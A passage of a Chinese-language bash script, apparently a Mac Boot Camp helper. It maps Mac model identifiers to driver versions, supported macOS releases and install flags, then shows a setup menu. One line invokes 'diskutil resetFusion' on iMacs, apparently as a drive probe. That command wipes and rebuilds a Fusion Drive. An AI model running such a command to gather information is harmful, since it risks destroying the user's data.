									if [[ $modelbb = *"MacBook7,1"* ]]; then
									zgmac="10.13"
									MBR10="1"
									win10sip="1"
									oldsz="1"
									wzhfxt="6135"
									wzhfxt7="4034"
									wzhfxt732="4036"
		echo
		dnjx="10MacBook"
		dnos="10.13.6"
		
	fi
										if [[ $modelbb = *"MacBook6,1"* ]]; then
										zgmac="10.13"
										MBR10="1"
										kyqs15="1"
										win10sip="1"
                                        wzhfxt7="4034"
                                        wzhfxt732="4036"
		echo
		dnjx="09MacBook末"
		dnos="10.13.6"
		
	fi
											if [[ $modelbb = *"MacBook5,2"* ]]; then
											zgmac="10.11"
											MBR10="1"
											kyqs15="1"
											win10sip="1"
											Win732="1"
											wzhfxt7="4034"
											wzhfxt732="4036"
		echo
		dnjx="09MacBook中初"
		dnos="10.11.6"
		
	fi
											if [[ $modelbb = *"MacBook5,1"* ]]; then
											zgmac="10.11"
											MBR10="1"
											kyqs15="1"
											win10sip="1"
											Win732="1"
											wzhfxt7="4034"
											wzhfxt732="4036"
		echo
		dnjx="08MacBook末-铝合金外壳"
		dnos="10.11.6"
		
	fi	
											if [[ $modelbb = *"MacBook4,1"* ]]; then
											zgmac="10.7"
											MBR10="1"
											Win732="1"
											wzhfxt7="4034"
											wzhfxt732="4036"
		echo
		dnjx="08MacBook中末"
		dnos="10.7.5"
		
	fi	
	
											if [[ $modelbb = *"MacBook3,1"* ]]; then
											zgmac="10.7"
											MBR10="1"
											Win732="1"
											wzhfxt7="4034"
											wzhfxt732="4036"
											zzc32="1"
		echo
		dnjx="07MacBook末"
		dnos="10.7.5"
		
	fi		
	
											if [[ $modelbb = *"MacBook2,1"* ]]; then
											zgmac="10.7"
											MBR10="1"
											Win732="1"
											wzhfxt7="4034"
											wzhfxt732="4036"
											zzc32="1"
		echo
		dnjx="06末-07中MacBook"
		dnos="10.7.5"
		
	fi	
	
											if [[ $modelbb = *"MacBook1,1"* ]]; then
											zgmac="10.6"
											MBR10="1"
											Win732="1"
											wzhfxt7="4034"
											wzhfxt732="4036"
											zzc32="1"
		echo
		dnjx="第一代MacBook"
		dnos="10.6.8"
		
	fi
	
											   if [[ $modelbb = *"MacBookPro16,3"* ]]; then
											   NoWin7="1"
											   SddWin10="1"
											   T2XP="1"
											   bt7="1"
											   wzhfxt="7931"
											   xsqjc="1"
		echo
		dnjx="13寸-20Pro"
		
	fi
			
												if [[ $modelbb = *"MacBookPro16,2"* ]]; then
												NoWin7="1"
												SddWin10="1"
												T2XP="1"
												bt7="1"
												wzhfxt="7931"
												xsqjc="1"
		echo
		dnjx="13寸-20Pro"
		
	fi
												if [[ $modelbb = *"MacBookPro16,1"* ]]; then
												NoWin7="1"
												SddWin10="1"
												T2XP="1"
												bt7="1"
												wzhfxt="7748"
												xsqjc="1"
		echo
		dnjx="16寸-19Pro[5300/5500M]"
		
	fi
			
												if [[ $modelbb = *"MacBookPro16,4"* ]]; then
												NoWin7="1"
												SddWin10="1"
												T2XP="1"
												bt7="1"
												wzhfxt="8034"
												xsqjc="1"
		echo
		dnjx="16寸-19Pro[5600M]"
		
	fi
				
												if [[ $modelbb = *"MacBookPro15,4"* ]]; then
												NoWin7="1"
												SddWin10="1"
												T2XP="1"
												bt7="1"
												wzhfxt="7577"
												xsqjc="1"
		echo
		dnjx="13寸-19Pro[Two]"
		
	fi
					
												if [[ $modelbb = *"MacBookPro15,3"* ]]; then
												NoWin7="1"
												SddWin10="1"
												T2XP="1"
												bt7="1"
												wzhfxt="7071"
												xsqjc="1"
		echo
		dnjx="15寸-19Pro"
		
	fi
						
												if [[ $modelbb = *"MacBookPro15,2"* ]]; then
												NoWin7="1"
												SddWin10="1"
												T2XP="1"
												bt7="1"
												wzhfxt="7072"
												xsqjc="1"
		echo
		dnjx="13寸-18/19Pro"
		
	fi
							
												if [[ $modelbb = *"MacBookPro15,1"* ]]; then
												NoWin7="1"
												SddWin10="1"
												T2XP="1"
												bt7="1"
												wzhfxt="7071"
												xsqjc="1"
		echo
		dnjx="15寸-18Pro"
		
	fi
								
												if [[ $modelbb = *"MacBookPro14,3"* ]]; then
												NoWin7="1"
												SddWin10="1"
												lanya="1"
												wzhfxt="6851"
												sdqh="1"
												xsqjc="1"
		echo
		dnjx="15寸-17Pro"
		dnos="13.x.x"
	fi
									
												if [[ $modelbb = *"MacBookPro14,2"* ]]; then
												NoWin7="1"
												SddWin10="1"
												lanya="1"
												wzhfxt="6813"
												wzwim="1"
												sdqh="1"
												xsqjc="1"
												if [[ $model512 = "512 Bytes" ]]; then
												wzhfxt="6814"
												wzwim=""
												fi
		echo
		dnjx="13寸-17Pro"
		dnos="13.x.x"
	fi
										
												if [[ $modelbb = *"MacBookPro14,1"* ]]; then
												NoWin7="1"
												SddWin10="1"
												lanya="1"
												wzhfxt="6813"
												wzwim="1"
												sdqh="1"
												xsqjc="1"
												if [[ $model512 = "512 Bytes" ]]; then
												wzhfxt="6814"
												wzwim=""
												fi
		echo
		dnjx="13寸-17Pro"
		dnos="13.x.x"
	fi
											
												if [[ $modelbb = *"MacBookPro13,3"* ]]; then
												NoWin7="1"
												SddWin10="1"
												lanya="1"
												wf16="1"
												zgmac="12.0"
												wzhfxt="6655"
												sdqh="1"
												xsqjc="1"
		echo
		dnjx="15寸-16Pro"
		dnos="12.x.x"		
	fi
											
												if [[ $modelbb = *"MacBookPro13,2"* ]]; then
												NoWin7="1"
												SddWin10="1"
												lanya="1"
												wf16="1"
												zgmac="12.0"
												wzhfxt="6660"
												sdqh="1"
												xsqjc="1"
		echo
		dnjx="13寸-16Pro"
		dnos="12.x.x"		
	fi
												
												if [[ $modelbb = *"MacBookPro13,1"* ]]; then
												NoWin7="1"
												SddWin10="1"
												lanya="1"
												wf16="1"
												zgmac="12.0"
												wzhfxt="6660"
												sdqh="1"
												xsqjc="1"
		echo
		dnjx="13寸-16Pro"
		dnos="12.x.x"		
	fi
													
												if [[ $modelbb = *"MacBookPro11,4"* ]]; then
												NoWin7="1"
												SddWin10="1"
												btap="15EFI"
												EFI8="1"
												zgmac="12.0"
												wzhfxt="6136"
												amdbb=$(echo "$modelid" | grep 'AMD')
	                                            if [ "$amdbb" ]; then
	                                            wzhfxt="6133"
	                                            fi
	                                            if [[ $model512 = "4096 Bytes" ]]; then
												wzhfxt="6138"
												fi
												xsqjc="1"
		echo
		dnjx="15寸-15Pro"
		dnos="12.x.x"		
	fi
														
												if [[ $modelbb = *"MacBookPro11,5"* ]]; then
												NoWin7="1"
												SddWin10="1"
												EFI8="1"
												zgmac="12.0"
												wzhfxt="6136"
												amdbb=$(echo "$modelid" | grep 'AMD')
	                                            if [ "$amdbb" ]; then
	                                            wzhfxt="6133"
	                                            fi
	                                            if [[ $model512 = "4096 Bytes" ]]; then
												wzhfxt="6138"
												fi
												xsqjc="1"
		echo
		dnjx="15寸-15Pro"
		dnos="12.x.x"		
	fi
															
												if [[ $modelbb = *"MacBookPro12,1"* ]]; then
												NoWin7="1"
												SddWin10="1"
												btap="15EFI"
												EFI8="1"
												zgmac="12.0"
												wzhfxt="6136"
												if [[ $model512 = "4096 Bytes" ]]; then
												wzhfxt="6138"
												fi
												xsqjc="1"
		echo
		dnjx="13寸-15Pro"
		dnos="12.x.x"		
	fi
																
												if [[ $modelbb = *"MacBookPro11,2"* ]]; then
												btap="5.1.5640"
												SddWin10="1"
												zgmac="11.0"
												No732="1"
												wzhfxt="6136"
												if [ "$pcissd" ]; then
					                            wzhfxt="6137"
					                            fi
					                            if [[ $model512 = "4096 Bytes" ]]; then
												wzhfxt="6138"
												fi
												wzhfxt7="5640"
												xsqjc="1"
		echo
		dnjx="15寸-13末/14中Pro"
		dnos="11.x.x"
		
	fi
																
												if [[ $modelbb = *"MacBookPro11,3"* ]]; then
												btap="5.1.5640"
												SddWin10="1"
												zgmac="11.0"
												No732="1"
												wzhfxt="6136"
												if [ "$pcissd" ]; then
					                            wzhfxt="6137"
					                            fi
					                            if [[ $model512 = "4096 Bytes" ]]; then
												wzhfxt="6138"
												fi
												wzhfxt7="5640"
												xsqjc="1"
		echo
		dnjx="15寸-13末/14中Pro"
		dnos="11.x.x"
		
	fi
																	
												if [[ $modelbb = *"MacBookPro11,1"* ]]; then
												btap="5.1.5640"
												SddWin10="1"
												zgmac="11.0"
												No732="1"
												wzhfxt="6136"
												if [ "$pcissd" ]; then
					                            wzhfxt="6137"
					                            fi
					                            if [[ $model512 = "4096 Bytes" ]]; then
												wzhfxt="6138"
												fi
												wzhfxt7="5640"
												xsqjc="1"
		echo
		dnjx="13寸-13末/14中Pro"
		dnos="11.x.x"
		
	fi
																		
												if [[ $modelbb = *"MacBookPro10,2"* ]]; then
												btap="4.1.4586"
												w10btap="6.0.6136"
												win10sip="1"
												zgmac="10.15"
												MBR10="1"
												oldsz="1"
												No732="1"
												wzhfxt="6135"
												wzhfxt7="5621"
												xsqjc="1"
		echo
		dnjx="13寸-12末/13初Pro"
		dnos="10.15.7"
		
	fi
																			
												if [[ $modelbb = *"MacBookPro10,1"* ]]; then
												btap="4.0.4326"
												w10btap="6.0.6136"
												win10sip="1"
												xkm="1"
												zgmac="10.15"
												MBR10="1"
												oldsz="1"
												wzhfxt="6135"
												wzhfxt7="5621"
												wzhfxt732="4036"
												xsqjc="1"
		echo
		dnjx="15寸-12中/13初Pro"
		dnos="10.15.7"
		
	fi
																				
												if [[ $modelbb = *"MacBookPro9,1"* ]]; then
												btap="4.0.4255"
												w10btap="6.0.6136"
												win10sip="1"
												xkm="1"
												zgmac="10.15"
												MBR10="1"
												oldsz="1"
												wzhfxt="6135"
												wzhfxt7="5621"
												wzhfxt732="4036"
		echo
		dnjx="15寸-12中Pro"
		dnos="10.15.7"
		
	fi
																				
												if [[ $modelbb = *"MacBookPro9,2"* ]]; then
												btap="4.0.4255"
												w10btap="6.0.6136"
												win10sip="1"
												zgmac="10.15"
												MBR10="1"
												oldsz="1"
												wzhfxt="6135"
												wzhfxt7="5621"
												wzhfxt732="4036"
		echo
		dnjx="13寸-12中Pro"
		dnos="10.15.7"
		
	fi	
																					
												if [[ $modelbb = *"MacBookPro8,3"* ]]; then
												win10sip="1"
												xkm="1"
												zgmac="10.13"
												MBR10="1"
												wzhfxt="6135"
												wzhfxt7="5621"
												wzhfxt732="4036"
		echo
		dnjx="17寸-11Pro"
		dnos="10.13.6"
		
	fi	
																					
												if [[ $modelbb = *"MacBookPro8,2"* ]]; then
												win10sip="1"
												xkm="1"
												zgmac="10.13"
												MBR10="1"
												wzhfxt="6135"
												wzhfxt7="5621"
												wzhfxt732="4036"
		echo
		dnjx="15寸-11Pro"
		dnos="10.13.6"
		
	fi	
																					
												if [[ $modelbb = *"MacBookPro8,1"* ]]; then
												win10sip="1"
												zgmac="10.13"
												MBR10="1"
												kyqs15="1"
												wzhfxt="6135"
												wzhfxt7="5621"
												wzhfxt732="4036"
		echo
		dnjx="13寸-11Pro"
		dnos="10.13.6"
		
	fi	
																						
												if [[ $modelbb = *"MacBookPro7,1"* ]]; then
												zgmac="10.13"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												wzhfxt="6135"
									            wzhfxt7="4034"
									            wzhfxt732="4036"
		echo
		dnjx="13寸-10Pro"
		dnos="10.13.6"
		
	fi	
																					
												if [[ $modelbb = *"MacBookPro6,2"* ]]; then
												zgmac="10.13"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="15寸-10Pro"
		dnos="10.13.6"
		
	fi	
																						
												if [[ $modelbb = *"MacBookPro6,1"* ]]; then
												zgmac="10.11"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="17寸-10Pro"
		dnos="10.11.6"
		
	fi	
																							
												if [[ $modelbb = *"MacBookPro5,5"* ]]; then
												zgmac="10.11"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="13寸-09Pro"
		dnos="10.11.6"
		
	fi	
	
												if [[ $modelbb = *"MacBookPro5,4"* ]]; then
												zgmac="10.11"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="15寸-09Pro"
		dnos="10.11.6"
		
	fi					
																			
												if [[ $modelbb = *"MacBookPro5,3"* ]]; then
												zgmac="10.11"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="15寸-09Pro"
		dnos="10.11.6"
		
	fi	
																																																
												if [[ $modelbb = *"MacBookPro5,2"* ]]; then
												zgmac="10.11"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="17寸-09Pro"
		dnos="10.11.6"
		
	fi	
																								
												if [[ $modelbb = *"MacBookPro5,1"* ]]; then
												zgmac="10.11"
												MBR10="1"
												kyqs15="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="15寸-08Pro"
		dnos="10.11.6"
		
	fi	
																									
												if [[ $modelbb = *"MacBookPro4,1"* ]]; then
												zgmac="10.11"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="15寸/17寸-08Pro"
		dnos="10.11.6"
		
	fi	
																									
												if [[ $modelbb = *"MacBookPro3,1"* ]]; then
												zgmac="10.11"
												MBR10="1"
												win10sip="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="15寸/17寸-07Pro"
		dnos="10.11.6"
		
	fi																											
																									
												if [[ $modelbb = *"MacBookPro2,1"* ]]; then
												zgmac="10.7"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="17寸-06Pro"
		dnos="10.7.5"
		
	fi	
																									
												if [[ $modelbb = *"MacBookPro2,2"* ]]; then
												zgmac="10.7"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="15寸-06Pro"
		dnos="10.7.5"
		
	fi
																									
												if [[ $modelbb = *"MacBookPro1,1"* ]]; then
												zgmac="10.6"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="15寸-06Pro"
		dnos="10.6.8"
		
	fi	
																										
												if [[ $modelbb = *"MacBookPro1,2"* ]]; then
												zgmac="10.6"
												MBR10="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="17寸-06Pro"
		dnos="10.6.8"
		
	fi	
	
												if [[ $modelbb = *"iMac20,1"* ]]; then
												NoWin7="1"
												T2XP="1"
												bt7="1"
												wzhfxt="8082"
		echo
		dnjx="27寸-20iMac[5K]"
		
	fi	
																											
												if [[ $modelbb = *"iMac20,2"* ]]; then
												NoWin7="1"
												T2XP="1"
												bt7="1"
												wzhfxt="8082"
		echo
		dnjx="27寸-20iMac[5k]"
		
	fi	
																												
												if [[ $modelbb = *"iMac19,2"* ]]; then
												NoWin7="1"
												iMacbb="1"
												bt7="1"
												wzhfxt="7866"
		echo
		dnjx="21.5寸-19iMac[4K]"
		
	fi	
																													
												if [[ $modelbb = *"iMac19,1"* ]]; then
												NoWin7="1"
												iMacbb="1"
												bt7="1"
												wzhfxt="7866"
		echo
		dnjx="27寸-19iMac[5K]"
		
	fi	
																														
												if [[ $modelbb = *"iMacPro1,1"* ]]; then
												NoWin7="1"
												iMacbb="1"
												bt7="1"
												wzhfxt="7866"
		echo
		dnjx="27寸-17iMacPro[5K]"
		
	fi	
																															
												if [[ $modelbb = *"iMac18,3"* ]]; then
												NoWin7="1"
												iMacbb="1"
												bt7="1"
												wzhfxt="7866"
		echo
		dnjx="27寸-17iMac[5K]"
		dnos="13.x.x"
	fi	
																																
												if [[ $modelbb = *"iMac18,2"* ]]; then
												NoWin7="1"
												iMacbb="1"
												bt7="1"
												wzhfxt="7866"
		echo
		dnjx="21.5寸-17iMac[4K]"
		dnos="13.x.x"
	fi	
																																	
												if [[ $modelbb = *"iMac18,1"* ]]; then
												NoWin7="1"
												iMacbb="1"
												wzhfxt="6721"
		echo
		dnjx="21.5寸-17iMac[普通屏]"
		dnos="13.x.x"
	fi	
																																		
												if [[ $modelbb = *"iMac17,1"* ]]; then
												NoWin7="1"
												iMacbb="1"
												EFI8="1"
												zgmac="12.0"
												wzhfxt="6251"
		echo
		dnjx="27寸-15iMac末[5K]"
		dnos="12.x.x"		
	fi	
																																			
												if [[ $modelbb = *"iMac16,2"* ]]; then
												NoWin7="1"
												iMacbb="1"
												EFI8="1"
												zgmac="12.0"
												wzhfxt="6251"
		echo
		dnjx="21.5寸-15iMac末[4K]"
		dnos="12.x.x"		
	fi	
																																				
												if [[ $modelbb = *"iMac16,1"* ]]; then
												NoWin7="1"
												iMacbb="1"
												EFI8="1"
												zgmac="12.0"
												wzhfxt="6251"
		echo
		dnjx="21.5寸-15iMac末"
		dnos="12.x.x"		
	fi	
																																					
												if [[ $modelbb = *"iMac15,1"* ]]; then
												btap="5.1.5769"
												iMacbb="1"
												EFI8="1"
												No732="1"
												zgmac="11.0"
												wzhfxt="6140"
		echo
		dnjx="27寸-15中/14末iMac[5K]"
		dnos="11.x.x"		
	fi	
																																						
												if [[ $modelbb = *"iMac14,4"* ]]; then
												btap="5.1.5722"
												iMacbb="1"
												No732="1"
												zgmac="11.0"
												wzhfxt="6133"
		echo
		dnjx="21寸-14iMac中"
		dnos="11.x.x"		
	fi	
												if [[ $modelbb = "iMac14,3" ]]; then
												btap="5.1.5640"
												zgmac="10.15"
												iMacbb="1"
												oldsz="1"
												No732="1"
												wzhfxt="6140"
												wzhfxt7="5641"
		echo
		dnjx="21.5寸-13iMac末"
		dnos="10.15.7"
	fi																																						
												if [[ $modelbb = *"iMac14,2"* ]]; then
												btap="5.1.5640"
												zgmac="10.15"
												iMacbb="1"
												oldsz="1"
												No732="1"
												wzhfxt="6133"
		echo
		dnjx="27寸-13iMac末"
		dnos="10.15.7"
	fi	
																																								
												if [[ $modelbb = *"iMac14,1"* ]]; then
												btap="5.1.5640"
												zgmac="10.15"
												iMacbb="1"
												oldsz="1"
												No732="1"
												wzhfxt="6133"
		echo
		dnjx="21.5寸-13iMac末"
		dnos="10.15.7"
	fi	
	
												if [[ $modelbb = *"iMac13,3"* ]]; then
												btap="5.1.5621"
												w10btap="6.0.6136"
												zgmac="10.15"
												iMacbb="1"
												oldsz="1"
												No732="1"
												wzhfxt="6133"
		echo
		dnjx="21.5寸-13iMac中"
		dnos="10.15.7"
	fi
																																										
												if [[ $modelbb = "iMac13,2" ]]; then
												btap="5.1.5621"
												w10btap="6.0.6136"
												win10sip="1"
												zgmac="10.15"
												MBR10="1"
												iMacbb="1"
												oldsz="1"
												No732="1"
												wzhfxt="6135"
												wzhfxt7="5622"
		echo
		dnjx="27寸-12iMac末"
		dnos="10.15.7"
	fi	
																																										
												if [[ $modelbb = *"iMac13,1"* ]]; then
												btap="5.1.5621"
												w10btap="6.0.6136"
												win10sip="1"
												zgmac="10.15"
												MBR10="1"
												iMacbb="1"
												oldsz="1"
												No732="1"
												wzhfxt="6135"
		echo
		dnjx="21.5寸-12iMac末"
		dnos="10.15.7"
	fi	
																																											
												if [[ $modelbb = *"iMac12,2"* ]]; then
												btap="5.1.5621"
												win10sip="1"
												zgmac="10.13"
												MBR10="1"
												oldsz="1"
												wzhfxt="6135"
												wzhfxt7="5624"
												wzhfxt732="4036"
		echo
		dnjx="11iMac中"
		dnos="10.13.6"
	fi	
																																												
												if [[ $modelbb = *"iMac12,1"* ]]; then
												btap="5.1.5621"
												win10sip="1"
												zgmac="10.13"
												MBR10="1"
												oldsz="1"
												wzhfxt="6135"
												wzhfxt7="5624"
												wzhfxt732="4036"
		echo
		dnjx="11iMac中"
		dnos="10.13.6"
	fi	
																																													
												if [[ $modelbb = *"iMac11,3"* ]]; then
												zgmac="10.13"
												win10sip="1"
												MBR10="1"
												oldsz="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="10iMac中"
		dnos="10.13.6"
	fi	
																																														
												if [[ $modelbb = *"iMac11,2"* ]]; then
												zgmac="10.13"
												win10sip="1"
												MBR10="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="10iMac中"
		dnos="10.13.6"
		
	fi	

												if [[ $modelbb = *"iMac11,1"* ]]; then
												zgmac="10.13"
												win10sip="1"
												MBR10="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="09iMac末"
		dnos="10.13.6"
		
	fi																																																
												if [[ $modelbb = *"iMac10,1"* ]]; then
												zgmac="10.13"
												win10sip="1"
												MBR10="1"
												kyqs15="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="09iMac末"
		dnos="10.13.6"
		
	fi	
																																																
												if [[ $modelbb = *"iMac9,1"* ]]; then
												zgmac="10.11"
												win10sip="1"
												MBR10="1"
												kyqs15="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="09iMac中初"
		dnos="10.11.6"
	
	fi
					
												if [[ $modelbb = *"iMac8,1"* ]]; then
												zgmac="10.11"
												win10sip="1"
												MBR10="1"
												kyqs15="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="08iMac"
		dnos="10.11.6"
	
	fi							
					
												if [[ $modelbb = *"iMac7,1"* ]]; then
												zgmac="10.11"
												win10sip="1"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="20寸-07iMac"
		dnos="10.11.6"
	
	fi
	
												if [[ $modelbb = *"iMac6,1"* ]]; then
												zgmac="10.7"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="24寸-06iMac"
		dnos="10.7.5"
	
	fi		
	
												if [[ $modelbb = *"iMac5,1"* ]]; then
												zgmac="10.7"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="17寸/20寸-06末iMac"
		dnos="10.7.5"
	
	fi
	
												if [[ $modelbb = *"iMac5,2"* ]]; then
												zgmac="10.7"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="17寸-06末iMac"
		dnos="10.7.5"
	
	fi
	
												if [[ $modelbb = *"iMac4,1"* ]]; then
												zgmac="10.6"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="17寸-06中iMac"
		dnos="10.6.8"
	
	fi	
												if [[ $modelbb = *"iMac4,2"* ]]; then
												zgmac="10.6"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="17寸-06中iMac"
		dnos="10.6.8"
	
	fi
				
								
												if [[ $modelbb = *"Macmini8,1"* ]]; then
												NoWin7="1"
												T2XP="1"
												wzhfxt="7139"
		echo
		dnjx="18Mini"
	
	fi	
							
												if [[ $modelbb = *"Macmini7,1"* ]]; then
												btap="5.1.5769"
												No732="1"
												wzhfxt="6136"
												wzhfxt7="5640"
		echo
		dnjx="14Mini"
		dnos="12.x.x"		
	fi
							
												if [[ $modelbb = *"Macmini6,1"* ]]; then
												zgmac="10.15"
												btap="5.1.5621"
												w10btap="6.0.6136"
												win10sip="1"
												MBR10="1"
												oldsz="1"
												No732="1"
												wzhfxt="6135"
												wzhfxt7="5621"
		echo
		dnjx="12Mini"
	    dnos="10.15.7"
	fi
							
												if [[ $modelbb = *"Macmini6,2"* ]]; then
												zgmac="10.15"
												btap="5.1.5621"
												w10btap="6.0.6136"
												win10sip="1"
												MBR10="1"
												oldsz="1"
												No732="1"
												wzhfxt="6135"
												wzhfxt7="5621"
		echo
		dnjx="12Mini"
	    dnos="10.15.7"
	fi
								
												if [[ $modelbb = *"Macmini5,1"* ]]; then
												zgmac="10.13"
												btap="5.1.5621"
												win10sip="1"
												MBR10="1"
												kyqs15="1"
												oldsz="1"
												wzhfxt732="4036"
												wzhfxt7="5621"
		echo
		dnjx="11Mini"
	    dnos="10.13.6"
	fi
								
												if [[ $modelbb = *"Macmini5,2"* ]]; then
												zgmac="10.13"
												btap="5.1.5621"
												win10sip="1"
												MBR10="1"
												oldsz="1"
												wzhfxt732="4036"
		echo
		dnjx="11Mini"
	    dnos="10.13.6"
	fi
												if [[ $modelbb = *"Macmini5,3"* ]]; then
												zgmac="10.13"
												btap="5.1.5621"
												win10sip="1"
												MBR10="1"
												oldsz="1"
												wzhfxt732="4036"
		echo
		dnjx="11Mini-Server"
	    dnos="10.13.6"
	fi	
									
												if [[ $modelbb = *"Macmini4,1"* ]]; then
												zgmac="10.13"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												oldsz="1"
												wzhfxt="6135"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="10Mini"
	    dnos="10.13.6"
	fi
										
												if [[ $modelbb = *"Macmini3,1"* ]]; then
												zgmac="10.11"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="09Mini"
	    dnos="10.11.6"
	fi
										
												if [[ $modelbb = *"Macmini2,1"* ]]; then
												zgmac="10.7"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="07Mini"
	    dnos="10.7.5"
	fi
										
												if [[ $modelbb = *"Macmini1,1"* ]]; then
												zgmac="10.6"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="06Mini"
	    dnos="10.6.8"
	fi
	

echo "本机机型："$dnjx""


echo "兼容MacOS："$dnos""


xsq1="$(system_profiler SPDisplaysDataType | grep Resolution | awk 'NF+=1' | sed 's/Resolution://g' | cut -b 12- | sed -e 's/, /\n/g' | sed -n 1p)"
xsq2="$(system_profiler SPDisplaysDataType | grep Resolution | awk 'NF+=1' | sed 's/Resolution://g' | cut -b 12- | sed -e 's/, /\n/g' | sed -n 2p)"	
			
	if [[ $lldow = *"1"* ]]; then
		echo
		echo "已开启浏览器下载模式"	
	fi
	
	xksfcz=$(echo "$modelid" | grep 'AMD')
	amdxk=$(echo "$modelid" | grep 'AMD')
	if [ ! "$xksfcz" ]; then
	xksfcz=$(echo "$modelid" | grep 'NVIDIA')
	fi
	
	if [ "$xkm" ]; then
	if [ ! "$xksfcz" ]; then
	xkbcz="1"
	fi
	fi

    if [ "$xsqjc" ]; then
    xsqjcc=$(echo "$xsq1" | grep 'Retina')
	if [ ! "$xsqjcc" ]; then
	wybxsq="1"
	fi
    fi
	
	if [ "$xkbcz" ]; then
	echo
	echo "此机型，检测不到独立显卡，无法安装！"
	fi
	
	if [ "$pcissd" ]; then
	echo
	echo "注意：检测到PCI转接硬盘！"
	fi
	
if [ ! "$imachdd" ]; then
if [ "$iMacbb" ]; then
imachdd="$(diskutil resetFusion | grep "Rotational")" 
fi
fi
	
if [ "$iMacbb" ]; then
if [ ! "$imachdd" ]; then
imachdd="$(diskutil list | grep 'Fusion Drive')"
fi
fi

EFIS=""
HBFQS=""
PEDrv=""
repe=""
name=""
url=""
name2=""
url2=""
mjh7=""
soft=""
re700=""
re800=""
index=""
OsWin764=""
SourceSHA1=""
SourceMD5=""
SourceMD52=""
pnputil=""
Win11=""
drvname=""
xtname=""
xtname2=""
xnjaz=""
pd107z=""
azw11=""
azw10=""
azw7=""
isoesd=""
isoName=""
uups=""
iso7=""
HFSIP=""
azuppe=""
azbdpe=""
upazmac=""
azmac=""
azof=""
SCPD=""
SCVM=""
SCXNJ=""
CustomizeURL=""
DrvWZ=""


if [ "$tzms" ]; then
MSDN
fi

if [ ! "$jbjm" ]; then
XTLB
fi
echo
echo
echo
echo
echo
echo
read -s -p "_______请输入:" CustomizeURL
case "$CustomizeURL" in
	x)
	Start_menu
	;;
	8)
	XTLB
	;;
	zz)
	if [ "$sysyy" = "" ]; then
	sysyy="en"
	Customize
	fi
	if [ "$sysyy" = "en" ]; then
	sysyy="tw"
	Customize
	fi
	if [ "$sysyy" = "tw" ]; then
	sysyy="ko"
	Customize
	fi
	if [ "$sysyy" = "ko" ]; then
	sysyy="jp"
	Customize
	fi	
	if [ "$sysyy" = "jp" ]; then
	sysyy=""
	Customize
	fi		
	;;
	fq)
    HBFQS="1"
    AZPKG
    ;;
	efi)
    EFIS="1"
    AZPKG
    ;; 
    scsip)
    SCSIP="1"
    AZPKG
    ;;  
    scpd)
    SCXNJ="1"
    SCPD="1"
    AZPKG
    ;; 
    scvm)
    SCXNJ="1"
    SCVM="1"
    AZPKG
    ;; 
	333333)
	if [[ $lldow = *"1"* ]]; then
	lldow="0"
	Customize
	fi
	lldow="1"
	Customize
	;;
	jj)
	if [ "$jdow" = "0" ]; then
	jdow="1"
	Customize
	fi
	jdow="0"
	Customize
	;;
	0)
	clear
	Start_menu
	;;
	4)
	Virtual
	;;
	6)
	clear
	open /System/Applications/Utilities/Boot\ Camp\ Assistant.app
    open /Applications/Utilities/Boot\ Camp\ Assistant.app
    Customize
	;;
	5)
	clear
	open /System/Applications/Utilities/Disk\ Utility.app 	
    open /Applications/Utilities/Disk\ Utility.app
    Customize	
	;;	
	*)
	clear
	
	if [ "${CustomizeURL}" = "6136" ]
	then
	if [ "$sip" ]; then
	if [ "$win10sip" ]; then
	clear && printf "\e[3J"
